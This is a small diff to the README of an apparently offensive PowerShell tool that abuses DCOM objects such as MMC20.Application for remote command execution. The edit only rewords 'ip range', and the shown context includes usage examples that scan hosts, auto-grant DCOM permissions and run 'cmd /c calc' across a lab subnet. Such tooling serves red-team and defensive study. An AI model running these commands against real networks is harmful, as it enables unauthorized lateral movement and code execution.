@@ -148,7 +148,7 @@ Invoke-DCOMObjectScan function allows you to scan DCOM objects and find vulnerab
 
             PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -HostList DC01 -SkipPermissionChecks -CheckAccessOnly -Verbose
 
-  3. Validates whether the `MMC20.Application` (ProgID) is applicable through `10.211.55.4/24` ip addresses range. If exists, he tool will try to enumerate the information about it. (using the current logged-on user session).
+  3. Validates whether the `MMC20.Application` (ProgID) is applicable through `10.211.55.4/24` range. If exists, he tool will try to enumerate the information about it. (using the current logged-on user session).
 
             PS> Invoke-DCOMObjectScan -Type Single -ObjectName "MMC20.Application" -Hostlist "10.211.55.4/24" -CheckAccessOnly -Verbose
 
@@ -184,7 +184,7 @@ Get-ExecutionCommand function allows to generate a PowerShell payload that will 
 
             PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.4" -Username "lab\Administrator" -Password "Aa123456!" -AutoGrant -Verbose
 
-  3. Tries to interact with `MMC20.Application` (ProgID) object through `10.211.55.1/24` ip range using current logged-on session without analyze ACL permissions
+  3. Tries to interact with `MMC20.Application` (ProgID) object through `10.211.55.1/24` range using current logged-on session without analyze ACL permissions
         then it will generates the execution command.
 
             PS> Get-ExecutionCommand -ObjectName "MMC20.Application" -ObjectPath "Document.ActiveView.ExecuteShellCommand" -HostList "10.211.55.1/24" -SkipPermissionChecks -Verbose
@@ -200,7 +200,7 @@ Invoke-ExecutionCommand function executes commands via DCOM Object using the log
 * Examples:
 
   1. Checks for DCOM access,  
-        In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grant access, Interact with `MMC20.Application` (ProgID) object through the IP range: `10.211.55.1/24` using current logged-on user session and Execute the following commands:
+        In case the principal-identity doesn't have the necessary permissions or the DCOM feature is disabled, the tool will enable the DCOM feature, grant access, Interact with `MMC20.Application` (ProgID) object through the range: `10.211.55.1/24` using current logged-on user session and Execute the following commands:
         1. Executes `cmd.exe /c calc` command
         2. Set `Frame.Top` attribute to `1`
         Finally, revert the machine to the same state as before the attack.
@@ -226,7 +226,7 @@ Invoke-RegisterRemoteSchema function executes commands via InternetExplorer.Appl
 **Note:** This object doesn't need any access to local machine hive, it will proceed with the foothold with any user that can access the remote machine!
 
 * Examples:
-  1. Executes `cmd /c calc` command on `10.211.55.1/24` ip range using the current logged-on session, and grant privileges if is needed
+  1. Executes `cmd /c calc` command on `10.211.55.1/24` range using the current logged-on session, and grant privileges if is needed
 
             PS> Invoke-RegisterRemoteSchema -HostList "10.211.55.1/24" -Command "cmd /c calc" -AutoGrant -Verbose
 
